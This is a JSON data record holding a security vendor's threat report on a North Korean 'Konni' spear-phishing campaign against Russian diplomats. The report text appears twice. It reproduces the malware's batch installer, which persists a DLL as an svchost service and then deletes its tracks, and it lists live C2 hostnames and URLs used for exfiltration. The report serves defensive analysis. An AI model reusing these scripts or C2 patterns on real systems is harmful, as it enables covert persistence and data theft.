@@ -1,0 +1,1521 @@
+{
+  "original_txt": " \n  \n \n \n \n \n \n \n \n \n \n \n \n01 // 03 // 2022 \n \n   \nNORTH KOREAN GROUP “KONNI” TARGETS \nTHE RUSSIAN DIPLOMATIC SECTOR WITH \nNEW VERSIONS OF MALWARE IMPLANTS\nwww.cluster25.io  \n \n@cluster25_io  \nTLP:WHITE  \n  2022 // © Cluster25   \nTABLE OF CONTENTS \n \n \nKILLCHAIN OVERVIEW 4  \nINITIAL ACCESS 4  \nDOWNLOADER ANALYSIS 5  \nKONNI RAT ANALYSIS 10  \nATTRIBUTION 13  \nATT&CK MATRIX 14  \nINDICATORS OF COMPROMISE 16  \nABOUT CLUSTER25 19  \n  \n  2022 // © Cluster25  EXECUTIVE SUMMARY \n \nCluster25  analyzed  a  recent  attack linked to the \nNorth Korean APT group “Konni” targeting \nRussian diplomatic sector using a spear phishing \ntheme for New Year's Eve festivities as lure. Once \nthe malicious email attachment is opened and \nexecuted, a chain composed by multiple stages is \ntriggered, allowing actor to install an implant \nbelonging to the Konni RAT family as final \npayload. 2022 // © Cluster25                                                                                                                                  4 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \n \n01 KILLCHAIN OVERVIEW  \n \nThe following diagram shows the overall phases used by the actor to infect the target. The \nmalicious activity starts from an email containing a malicious zip file, which once decompressed \ndrops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni \nRAT malware, named scrnsvc.dll , as Windows service. \n \n \n \n \n \n02 INITIAL ACCESS  \n \nC25 has traced an activity that started at least from August 2021 aimed at Russian targets \noperating in the diplomatic sector. \n 2022 // © Cluster25                                                                                                                                  5 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \n \nOn December 20th emails crafted to infect the Russian embassy located in Indonesia have been \ndetected; these emails used the New Year Eve 2022 festivity as decoy theme.  Contrary to its \npast actions, the North Korean APT group this time did not use malicious documents as \nattachments; instead, they attached a .zip file type named “ поздравление.zip ”, which means \n“congratulation” in Russian, containing an embedded executable representing the first stage of \nthe infection. The emails were spoofed using  a *@mid.ru  account as a sender to pretend that it \nwas sent from the Russian Embassy  in Serbia.  \n \n \n \n03 DOWNLOADER ANALYSIS  \n \nThe artifact found and extracted from the zip is a Windows x32 executable, named \n“поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 . From the recent \ncompilation date, it seems to have been developed specifically for the attack under analysis, and \nit can be identified by the following hash: \n \nSHA256 \ncdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5  \n 2022 // © Cluster25                                                                                                                                  6 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \n \nThe sample has the behavior of a trojan malware, and it is intended to resemble the legitimate \nscrnsave.scr   Windows application.  When executed, it drops under the %TEMP% directory an \nimage named Happy.jpg  (which is embedded in the resource section) and opens it as a \nforeground window to trick the victim into believing that it is a legitimate Russian themed happy \nholidays screensaver. \n \n \nSubsequently, in the background, the malware starts its malicious activities by downloading the \nnext stage payload from an HTTP GET request to the Command-and-Control domain \ni758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 \nand a type used as a flag to specify if the infected machine was 32 or 64 bit. The Command-and-\nControl Apache webserver response was configured to respond with HTTP status code 401, \nhaving the attacker set a fake .htaccess  (likely to ensure it went unnoticed at security checks), \nreturning as a response, in any case, a compressed CAB file encoded in base64 visible in the \nevidence below. \n \n 2022 // © Cluster25                                                                                                                                  7 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \n \n \nAfter the CAB downloading, the malware starts the file decompression using expand.exe  process \nlogging a file named  - a.log  - when the decompression is finished.  The following image illustrates \nthe snipped of code described. \n \n \n 2022 // © Cluster25                                                                                                                                  8 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \n \nTo optimize the time wasted during CAB decompression, the malware writes and executes the \nfollowing BAT file into the %TEMP%  directory, which was contained in the data section encoded \nin base64: \n \nCODE \n@ECHO OFF \nCD /D %TEMP% \n: WAITING \nTIMEOUT /T 1 \nIF NOT EXIST \"A.LOG\" (GOTO WAITING) \nDEL /F /Q \"A.LOG\" \nINSTALL.BAT \nDEL /F /Q \"%~DPNX0”  \n \nThe script’s scope is to wait for the decompression to finish by using the creation of a.log file as \nflag and automatically execute the content of the CAB extraction, which is the install.bat file (one \nof the files contained into the CAB), and finally delete itself using \"%~DPNX0” , a bat script \nconvention used to specify the BAT file itself. As previously described the CAB file’s \ndecompressed content contains the following files: \n Install.bat \n scrnsvc.ini \n scrnsvc.dll \n \nInstall.bat  file is the launcher of the next stage infection, which hides the tracks of the previous \nactivities by moving all the files into the System32 directory and installing and starting the final   2022 // © Cluster25                                                                                                                                  9 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \n \nimplant scrnsvc.dll as a Windows service named ScreenSaver Management Service , which, \nwhen registered, loads the configuration file scrnvsvc.ini. The Windows service is installed by \nconfiguring svchost.exe  as a process container of the DLL executable representing Konni RAT  \nmalware.  Install.bat  has already been seen among the TTPs belonging to this threat actor, which \ncontent is visible below, where, in this case, it appears to have been slightly modified, and therefore \nmore likely to deceive detection signatures referring to files used in previous intrusions. \n \nCODE \n@echo off \nset DSP_NAME=\"ScreenSaver Management Service\" \nsc stop scrnsvc > nul \necho %~dp0 | findstr /i \"system32\" > nul \nif %ERRORLEVEL% equ 0 (goto INSTALL) else (goto COPYFILE) \n: COPYFILE \ncopy /y \"%~dp0\\scrnsvc.dll\" \"%windir%\\System32\" > nul \ndel /f /q \"%~dp0\\scrnsvc.dll\" > nul \ncopy /y \"%~dp0\\scrnsvc.ini\" \"%windir%\\System32\" > nul \ndel /f /q \"%~dp0\\scrnsvc.ini\" > nul \ndel /f /q \"%windir%\\System32\\scrnsvc.dat\" > nul \n: INSTALL \nsc create scrnsvc binpath= \"%windir%\\System32\\svchost.exe -k scrnsvc\" DisplayName= %DSP_NAME% > nul \nsc description scrnsvc %DSP_NAME% > nul \nsc config scrnsvc type= interact type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k scrnsvc\" \n> nul \nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v scrnsvc /t REG_MULTI_SZ /d \"scrnsvc\" /f > \nnul  2022 // © Cluster25                                                                                                                                  10 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \nCODE \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\scrnsvc\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \n\"%windir%\\System32\\scrnsvc.dll\" /f > nul \nsc start scrnsvc > nul \ndel /f /q \"%~dp0\\wpnprv.dll\" > nul \ndel /f /q \"%~dp0\\*.bat\" > nul \ndel /f /q \"%~dpnx0\" > nul  \n \n04 KONNI RAT ANALYSIS \n \nThe following Konni Rat version is a x64 DLL executable, which has as compile timestamp Mon \nDec 20 09:02:38 2021  - UTC, same date of the downloader, and where the payload is contained \nin its export function ServiceMain  and is directly invoked when registered as Windows service.  \nCluster25 retrieved two different samples of the same Konni version identified by the following \nhashes: \n \nSHA256 \ncdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5  \n8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83  \n \nOnce registered as a service, the malware starts solving in runtime all the WinAPIs needed to \ninterface with the infected operating system's file system and to communicate with the control \nand monitoring server. The exported functions loaded belong to the following libraries: \n kernel32.dll \n advapi23.dll \n urlmon.dll  2022 // © Cluster25                                                                                                                                  11 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \n wininet.dll \n shell32.dll \nIt then creates a pointer memory structure used to store the configuration used by the malware \nduring execution, which contains information such as the name of the computer, the time of \nseconds to remain asleep, the domain used to communicate with the adversary command and \ncontrol, and all the information collected during the future enumeration. The configuration \nstructure is then passed as argument at a new thread created which is used as main routine by the \nmalware to perform the network communications and exfiltration, as visible in the following code \nsnippet. \n \nThe thread starts verifying if there is Internet connection available, remaining in sleep if not, then \nadds the value 65001 into the Registry key in Console Codepage , to make Unicode character set \nin cmd.exe by default, and collects data: \n Enumerated cached website via FindFirstUrlCacheEntryW  and \nFindNextUrlCacheEntryW  \n Enumerated operating system information using cmd /c systeminfo  \n Enumerated processes using cmd /c tasklist.exe  \n 2022 // © Cluster25                                                                                                                                  12 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \n \nOnce the enumeration has been completed, it stores all the info into temporary files which will then \nbe converted into a CAB file using cmd /c makecab  and furtherly encrypted and sent to the \nattacker server via HTTP POST request body to \nhxxp://455686[.]c1[.]biz/up[.]php?name=%COMPUTER-NAME% , passing the operating \nsystem computer name as parameter as evidences in the network dump reported following: \n \n \n \nIf the server response does not contain the string “ success! ” the malware tries to resend the \nrequest, or it starts to send HTTP GET loop requests to receive commands from the server located \nat hxxp://455686[.]c1[.]biz /dn.php?name=%COMPUTERNAME%&prefix=tt . The commands \nreceived are parsed from the response and, if containing the character ” >” are executed via \nCreateProcessAsUserW   obtaining the Token belonging to svchost.exe  process (likely to avoid \nexceptions during output redirection of the file writing, being the sample located in System32  \nfolder), otherwise using the CreateProcessW  function. \n \n \n 2022 // © Cluster25                                                                                                                                  13 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \n \n \nAt the time of the analysis the server was up but it did not provide the commands to be executed, \nprobably because the actor set up the Command and Control  backend with some form of \ngeofencing validation. \n \n05 ATTRIBUTION \n \nCluster25 attributes these intrusion attempts with high degree of confidence to the North Korean \ngroup known as Konni. Konni is also the name of their custom RAT which presents intelligence \ngathering features. In this case the final implant is a new version of Konni RAT having code and \nbehavioral similarities with its previous versions. The reported kill-chain shows overlaps with the \nTTPs already linked to this group as the use of CAB files as infection stage and the use of bat file \nto automatically install Konni RAT as a service. Identifiable modifications are evident in the pattern \nused for the initial access phase, most likely put in place to exploit the holiday time of year as bait.  \n \n 2022 // © Cluster25                                                                                                                                  14 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \n \nFinally, it is possible to notice the use of \"ZETTA HOSTING SOLUTIONS LLC\" ( AS44476 ) as \nhosting provider and the use of free hosting sites like c1 dot biz   and atwebpages dot com   for the \nCommand and Controls hostnames. Specifically, atwebpages dot com   appears to be commonly \nobservable in intrusions relating to threat actors belonging to the Kimsuki umbrella. \n \n06 ATT&CK MATRIX \n \nTACTIC TECHNIQUE  NAME \nInitial Access T1566 Phishing \nExecution  \nT1059  \nCommand and Scripting Interpreter \n \nT1204 User Execution \nT1569 System Services \n \nPersistence \n T1543 Create or Modify System Process \n \nPrivilege Escalation \n  \nT1543 \n Create or Modify System Process \n \nT1134 \n Access Token Manipulation  2022 // © Cluster25                                                                                                                                  15 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \nTACTIC TECHNIQUE  NAME \n \nDefense Evasion T1134 Access Token Manipulation \n \nT1140 \n Deobfuscate/Decode Files or Information \nDiscovery  \nT1082  \nSystem Information Discovery \n \n \nT1057  \nProcess discovery \n \nT1033  \nSystem Owner/User Discovery \n \nCollection  \nT1560 \n  \nArchive Collected Data \n \nT1113 \n  \nScreen Capture \n \nT1119  \nAutomated Collection \n \nCommand and Control  \nT1071 \n Application Layer Protocol \n Data encoding  2022 // © Cluster25                                                                                                                                  16 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \nTACTIC TECHNIQUE  NAME \nT1132 \n \n \n \nExfiltration  \nT1020 \n Automated Exfiltrated \n \n1041 \n Exfiltration Over C2 Channel \n \n \n07 INDICATORS OF COMPROMISE \n \nCATEGORY  TYPE VALUE \nPAYLOAD-DELIVERY SHA256 53b687202e69dd8d5e2e841036c96a12b93971c9ff99ca54c109c491e7ad8eba  \nPAYLOAD-DELIVERY SHA1 189fdac8fd88d61ba9cbd4f7d27561a6f60a9666 \nPAYLOAD-DELIVERY MD5 ad152ab451527cf2baa96304c6ecd383 \nPAYLOAD-DELIVERY SHA256 72185f9dbf66d0e5dc0e1873934c183bc120708085c0de8a0e2a748f10f77de8 \nPAYLOAD-DELIVERY SHA1 b433cc324a785e1d0291c961e2816e91a9549057 \nPAYLOAD-DELIVERY MD5 3462e40caeec0fa52bd3c04ad8cbc9d3 \nPAYLOAD-DELIVERY SHA256 451b9d4144555fcc791231db73ef3bfdb6ffddeb655e07a457108766f0e6ad39  2022 // © Cluster25                                                                                                                                  17 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \nPAYLOAD-DELIVERY SHA1 fb7d9bc8309f589e39e091ef5a7b08260596ffcd \nPAYLOAD-DELIVERY MD5 8ec9a6ff22c497375b53344cafeb2292 \nPAYLOAD-DELIVERY SHA256 4ca8ac99b2416d8fae67a8b18a58c8d267b7e2b72af1ee0369f2470a030af8c7 \nPAYLOAD-DELIVERY SHA1 6883e1c2c1f3656cb756264fde77f88ebcde541c \nPAYLOAD-DELIVERY MD5 446ea8033ae343971312745c79fced2e \nPAYLOAD-DELIVERY SHA256 b6845a436df2b3a79dd1b0e4a57a06c60f718eee0272a3eb81183ee4750037b9  \nPAYLOAD-DELIVERY SHA1 191604259def68250272919214aea109503200fe \nPAYLOAD-DELIVERY MD5 8269e1b2afaa832e7900640ebfe44bb4 \nPAYLOAD-DELIVERY SHA256 24f5fb91ca41e4a191a44629f064fa14c4063b7cda68ebc2b7afb7e68a9d3cdd \nPAYLOAD-DELIVERY SHA1 f08c033d1a9f2f75a17cbcb71e3041263d2d3e61 \nPAYLOAD-DELIVERY MD5 58560f053a099104b0f8ac1c9fed2903 \nPAYLOAD-DELIVERY SHA256 a3cd08afd7317d1619fba83c109f268b4b60429b4eb7c97fc274f92ff4fe17a2 \nPAYLOAD-DELIVERY SHA1 c1d312762d598831d431b08e47075047582856aa \nPAYLOAD-DELIVERY MD5 57a22e74ba27b034613b0c6ac54a10d5  2022 // © Cluster25                                                                                                                                  18 \n   \n Unrestricted // freely shareable content \n  \n \nTLP:WHITE \nPAYLOAD-DELIVERY SHA256 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83  \nPAYLOAD-DELIVERY SHA1 fc54cefe956ed5360418c0165cf2a687bbeb62fc \nPAYLOAD-DELIVERY MD5 954fe31816f2f7f095244573de8f9086 \nCNC HOSTNAME  i758769.atwebpages.com \nCNC HOSTNAME  455686.c1.biz \nCNC HOSTNAME  h378576.atwebpages.com \nDROP-POINT URL http://i758769.atwebpages.com/index.php?user_id=18756&type=1 \nCNC URL http://455686.c1.biz/dn.php?name=HOME-DESK&prefix=tt \nCNC URL http://h378576.atwebpages.com /dn.php?name=HOME-DESK&prefix=tt  \n ABOUT CLUSTER25  \n \nCluster25 is the internal Cyber Intelligence Research \nand Adversary Hunting Unit at DuskRise Inc. Cluster25 \nexperts are specialized in hunting and collecting cyber \nthreats, analysis, reverse-engineering and adversary \nhunting practices.  Cluster25 independently designs \nand develops technologies aimed at the classification \nand categorization of malicious artifacts as well as for \ntheir correlation with known threat groups. Relying on \nextensive visibility into the digital threat landscape, it \novercomes the usual limitations of services based on \nex-post threat observation by providing real predictive \nand proactive intelligence services.  \n \nVisit us at cluster25.io  \n \nIMPORTANT NOTICE: \n \n©2021 Cluster25. All rights reserved. The reproduction and \ndistribution of this material is prohibited without express written \npermission from Cluster25. Traffic Light Protocol (TLP) violation \ncould lead to the immediate cancellation of existing services as well \nas the initiation of legal actions aimed at protecting the intellectual \nproperty and competitive advantage of DuskRise Inc. Given the \ninherent nature of threat intelligence, the content contained in this \nreport is based on information gathered and understood at the time \nof its creation. The information in this report is general in nature and \ndoes not take into account the specific needs of your IT ecosystem \nand network, which may vary and require unique action. As such, \nCluster25 provides the information and content on an “as-is” basis \nwithout representation or warranty and accepts no liability for any \naction or failure to act taken in response to the information \ncontained or referenced in this report. The reader is responsible for \ndetermining whether or not to follow any of the suggestions, \nrecommendations or potential mitigations set out in this report, \nentirely at their own discretion. \n\n\n----------------------------------------\nConversion note:\nStatus: ok",
+  "sanitized_txt": "01 // 03 // 2022\nNORTH KOREAN GROUP “KONNI” TARGETS THE RUSSIAN DIPLOMATIC SECTOR WITH NEW VERSIONS OF MALWARE IMPLANTS www.cluster25.io\n@cluster25_io TLP:WHITE 2022 // © Cluster25 TABLE OF CONTENTS\nKILLCHAIN OVERVIEW 4 INITIAL ACCESS 4 DOWNLOADER ANALYSIS 5 KONNI RAT ANALYSIS 10 ATTRIBUTION 13 ATT&CK MATRIX 14 INDICATORS OF COMPROMISE 16 ABOUT CLUSTER25 19\n2022 // © Cluster25  EXECUTIVE SUMMARY\nCluster25  analyzed  a  recent  attack linked to the North Korean APT group “Konni” targeting Russian diplomatic sector using a spear phishing theme for New Year's Eve festivities as lure. Once the malicious email attachment is opened and executed, a chain composed by multiple stages is triggered, allowing actor to install an implant belonging to the Konni RAT family as final payload. 2022 // © Cluster25                                                                                                                                  4\nUnrestricted // freely shareable content\nTLP:WHITE\n01 KILLCHAIN OVERVIEW\nThe following diagram shows the overall phases used by the actor to infect the target. The malicious activity starts from an email containing a malicious zip file, which once decompressed drops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni RAT malware, named scrnsvc.dll , as Windows service.\n02 INITIAL ACCESS\nC25 has traced an activity that started at least from August 2021 aimed at Russian targets operating in the diplomatic sector.\n2022 // © Cluster25                                                                                                                                  5\nUnrestricted // freely shareable content\nTLP:WHITE\nOn December 20th emails crafted to infect the Russian embassy located in Indonesia have been detected; these emails used the New Year Eve 2022 festivity as decoy theme.  Contrary to its past actions, the North Korean APT group this time did not use malicious documents as attachments; instead, they attached a .zip file type named “ поздравление.zip ”, which means “congratulation” in Russian, containing an embedded executable representing the first stage of the infection. The emails were spoofed using  a *@mid.ru  account as a sender to pretend that it was sent from the Russian Embassy  in Serbia.\n03 DOWNLOADER ANALYSIS\nThe artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 . From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash:\nSHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25                                                                                                                                  6\nUnrestricted // freely shareable content\nTLP:WHITE\nThe sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr   Windows application.  When executed, it drops under the %TEMP% directory an image named Happy.jpg  (which is embedded in the resource section) and opens it as a foreground window to trick the victim into believing that it is a legitimate Russian themed happy holidays screensaver.\nSubsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit. The Command-and- Control Apache webserver response was configured to respond with HTTP status code 401, having the attacker set a fake .htaccess  (likely to ensure it went unnoticed at security checks), returning as a response, in any case, a compressed CAB file encoded in base64 visible in the evidence below.\n2022 // © Cluster25                                                                                                                                  7\nUnrestricted // freely shareable content\nTLP:WHITE\nAfter the CAB downloading, the malware starts the file decompression using expand.exe  process logging a file named  - a.log  - when the decompression is finished.  The following image illustrates the snipped of code described.\n2022 // © Cluster25                                                                                                                                  8\nUnrestricted // freely shareable content\nTLP:WHITE\nTo optimize the time wasted during CAB decompression, the malware writes and executes the following BAT file into the %TEMP%  directory, which was contained in the data section encoded in base64:\nCODE @ECHO OFF CD /D %TEMP% : WAITING TIMEOUT /T 1 IF NOT EXIST \"A.LOG\" (GOTO WAITING) DEL /F /Q \"A.LOG\" INSTALL.BAT DEL /F /Q \"%~DPNX0”\nThe script’s scope is to wait for the decompression to finish by using the creation of a.log file as flag and automatically execute the content of the CAB extraction, which is the install.bat file (one of the files contained into the CAB), and finally delete itself using \"%~DPNX0” , a bat script convention used to specify the BAT file itself. As previously described the CAB file’s decompressed content contains the following files:\n Install.bat  scrnsvc.ini  scrnsvc.dll\nInstall.bat  file is the launcher of the next stage infection, which hides the tracks of the previous activities by moving all the files into the System32 directory and installing and starting the final   2022 // © Cluster25                                                                                                                                  9\nUnrestricted // freely shareable content\nTLP:WHITE\nimplant scrnsvc.dll as a Windows service named ScreenSaver Management Service , which, when registered, loads the configuration file scrnvsvc.ini. The Windows service is installed by configuring svchost.exe  as a process container of the DLL executable representing Konni RAT malware.  Install.bat  has already been seen among the TTPs belonging to this threat actor, which content is visible below, where, in this case, it appears to have been slightly modified, and therefore more likely to deceive detection signatures referring to files used in previous intrusions.\nCODE @echo off set DSP_NAME=\"ScreenSaver Management Service\" sc stop scrnsvc > nul echo %~dp0 | findstr /i \"system32\" > nul if %ERRORLEVEL% equ 0 (goto INSTALL) else (goto COPYFILE) : COPYFILE copy /y \"%~dp0\\scrnsvc.dll\" \"%windir%\\System32\" > nul del /f /q \"%~dp0\\scrnsvc.dll\" > nul copy /y \"%~dp0\\scrnsvc.ini\" \"%windir%\\System32\" > nul del /f /q \"%~dp0\\scrnsvc.ini\" > nul del /f /q \"%windir%\\System32\\scrnsvc.dat\" > nul : INSTALL sc create scrnsvc binpath= \"%windir%\\System32\\svchost.exe -k scrnsvc\" DisplayName= %DSP_NAME% > nul sc description scrnsvc %DSP_NAME% > nul sc config scrnsvc type= interact type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k scrnsvc\" > nul reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v scrnsvc /t REG_MULTI_SZ /d \"scrnsvc\" /f > nul  2022 // © Cluster25                                                                                                                                  10\nUnrestricted // freely shareable content\nTLP:WHITE CODE reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\scrnsvc\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\System32\\scrnsvc.dll\" /f > nul sc start scrnsvc > nul del /f /q \"%~dp0\\wpnprv.dll\" > nul del /f /q \"%~dp0\\*.bat\" > nul del /f /q \"%~dpnx0\" > nul\n04 KONNI RAT ANALYSIS\nThe following Konni Rat version is a x64 DLL executable, which has as compile timestamp Mon Dec 20 09:02:38 2021  - UTC, same date of the downloader, and where the payload is contained in its export function ServiceMain  and is directly invoked when registered as Windows service.\nCluster25 retrieved two different samples of the same Konni version identified by the following hashes:\nSHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83\nOnce registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server. The exported functions loaded belong to the following libraries:\n kernel32.dll  advapi23.dll  urlmon.dll  2022 // © Cluster25                                                                                                                                  11\nUnrestricted // freely shareable content\nTLP:WHITE  wininet.dll  shell32.dll It then creates a pointer memory structure used to store the configuration used by the malware during execution, which contains information such as the name of the computer, the time of seconds to remain asleep, the domain used to communicate with the adversary command and control, and all the information collected during the future enumeration. The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.\nThe thread starts verifying if there is Internet connection available, remaining in sleep if not, then adds the value 65001 into the Registry key in Console Codepage , to make Unicode character set in cmd.exe by default, and collects data:\n Enumerated cached website via FindFirstUrlCacheEntryW  and FindNextUrlCacheEntryW  Enumerated operating system information using cmd /c systeminfo  Enumerated processes using cmd /c tasklist.exe 2022 // © Cluster25                                                                                                                                  12\nUnrestricted // freely shareable content\nTLP:WHITE\nOnce the enumeration has been completed, it stores all the info into temporary files which will then be converted into a CAB file using cmd /c makecab  and furtherly encrypted and sent to the attacker server via HTTP POST request body to hxxp://455686[.]c1[.]biz/up[.]php?name=%COMPUTER-NAME% , passing the operating system computer name as parameter as evidences in the network dump reported following:\nIf the server response does not contain the string “ success! ” the malware tries to resend the request, or it starts to send HTTP GET loop requests to receive commands from the server located at hxxp://455686[.]c1[.]biz /dn.php?name=%COMPUTERNAME%&prefix=tt . The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW   obtaining the Token belonging to svchost.exe  process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW  function.\n2022 // © Cluster25                                                                                                                                  13\nUnrestricted // freely shareable content\nTLP:WHITE\nAt the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control  backend with some form of geofencing validation.\n05 ATTRIBUTION\nCluster25 attributes these intrusion attempts with high degree of confidence to the North Korean group known as Konni. Konni is also the name of their custom RAT which presents intelligence gathering features. In this case the final implant is a new version of Konni RAT having code and behavioral similarities with its previous versions. The reported kill-chain shows overlaps with the TTPs already linked to this group as the use of CAB files as infection stage and the use of bat file to automatically install Konni RAT as a service. Identifiable modifications are evident in the pattern used for the initial access phase, most likely put in place to exploit the holiday time of year as bait.\n2022 // © Cluster25                                                                                                                                  14\nUnrestricted // freely shareable content\nTLP:WHITE\nFinally, it is possible to notice the use of \"ZETTA HOSTING SOLUTIONS LLC\" ( AS44476 ) as hosting provider and the use of free hosting sites like c1 dot biz   and atwebpages dot com   for the Command and Controls hostnames. Specifically, atwebpages dot com   appears to be commonly observable in intrusions relating to threat actors belonging to the Kimsuki umbrella.\n06 ATT&CK MATRIX\nPrivilege Escalation\nUnrestricted // freely shareable content\nTLP:WHITE TACTIC TECHNIQUE  NAME\nArchive Collected Data\nScreen Capture\nUnrestricted // freely shareable content\n1041 Exfiltration Over C2 Channel\n07 INDICATORS OF COMPROMISE\nCATEGORY  TYPE VALUE PAYLOAD-DELIVERY SHA256 53b687202e69dd8d5e2e841036c96a12b93971c9ff99ca54c109c491e7ad8eba PAYLOAD-DELIVERY SHA1 189fdac8fd88d61ba9cbd4f7d27561a6f60a9666 PAYLOAD-DELIVERY MD5 ad152ab451527cf2baa96304c6ecd383 PAYLOAD-DELIVERY SHA256 72185f9dbf66d0e5dc0e1873934c183bc120708085c0de8a0e2a748f10f77de8 PAYLOAD-DELIVERY SHA1 b433cc324a785e1d0291c961e2816e91a9549057 PAYLOAD-DELIVERY MD5 3462e40caeec0fa52bd3c04ad8cbc9d3 PAYLOAD-DELIVERY SHA256 451b9d4144555fcc791231db73ef3bfdb6ffddeb655e07a457108766f0e6ad39  2022 // © Cluster25                                                                                                                                  17\nUnrestricted // freely shareable content\nTLP:WHITE PAYLOAD-DELIVERY SHA1 fb7d9bc8309f589e39e091ef5a7b08260596ffcd PAYLOAD-DELIVERY MD5 8ec9a6ff22c497375b53344cafeb2292 PAYLOAD-DELIVERY SHA256 4ca8ac99b2416d8fae67a8b18a58c8d267b7e2b72af1ee0369f2470a030af8c7 PAYLOAD-DELIVERY SHA1 6883e1c2c1f3656cb756264fde77f88ebcde541c PAYLOAD-DELIVERY MD5 446ea8033ae343971312745c79fced2e PAYLOAD-DELIVERY SHA256 b6845a436df2b3a79dd1b0e4a57a06c60f718eee0272a3eb81183ee4750037b9 PAYLOAD-DELIVERY SHA1 191604259def68250272919214aea109503200fe PAYLOAD-DELIVERY MD5 8269e1b2afaa832e7900640ebfe44bb4 PAYLOAD-DELIVERY SHA256 24f5fb91ca41e4a191a44629f064fa14c4063b7cda68ebc2b7afb7e68a9d3cdd PAYLOAD-DELIVERY SHA1 f08c033d1a9f2f75a17cbcb71e3041263d2d3e61 PAYLOAD-DELIVERY MD5 58560f053a099104b0f8ac1c9fed2903 PAYLOAD-DELIVERY SHA256 a3cd08afd7317d1619fba83c109f268b4b60429b4eb7c97fc274f92ff4fe17a2 PAYLOAD-DELIVERY SHA1 c1d312762d598831d431b08e47075047582856aa PAYLOAD-DELIVERY MD5 57a22e74ba27b034613b0c6ac54a10d5  2022 // © Cluster25                                                                                                                                  18\nUnrestricted // freely shareable content\nTLP:WHITE PAYLOAD-DELIVERY SHA256 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 PAYLOAD-DELIVERY SHA1 fc54cefe956ed5360418c0165cf2a687bbeb62fc PAYLOAD-DELIVERY MD5 954fe31816f2f7f095244573de8f9086 CNC HOSTNAME  i758769.atwebpages.com CNC HOSTNAME  455686.c1.biz CNC HOSTNAME  h378576.atwebpages.com DROP-POINT URL http://i758769.atwebpages.com/index.php?user_id=18756&type=1 CNC URL http://455686.c1.biz/dn.php?name=HOME-DESK&prefix=tt CNC URL http://h378576.atwebpages.com /dn.php?name=HOME-DESK&prefix=tt ABOUT CLUSTER25\nCluster25 is the internal Cyber Intelligence Research and Adversary Hunting Unit at DuskRise Inc. Cluster25 experts are specialized in hunting and collecting cyber threats, analysis, reverse-engineering and adversary hunting practices.  Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups. Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services.\nVisit us at cluster25.io\nIMPORTANT NOTICE:\n©2021 Cluster25. All rights reserved. The reproduction and distribution of this material is prohibited without express written permission from Cluster25. Traffic Light Protocol (TLP) violation could lead to the immediate cancellation of existing services as well as the initiation of legal actions aimed at protecting the intellectual property and competitive advantage of DuskRise Inc. Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation. The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action. As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report. The reader is responsible for determining whether or not to follow any of the suggestions, recommendations or potential mitigations set out in this report, entirely at their own discretion.\n---------------------------------------- Conversion note:\nStatus: ok",
+  "ID_list": [
+    "T1020",
+    "T1033",
+    "T1057",
+    "T1059",
+    "T1071",
+    "T1082",
+    "T1113",
+    "T1119",
+    "T1132",
+    "T1134",
+    "T1140",
+    "T1204",
+    "T1543",
+    "T1560",
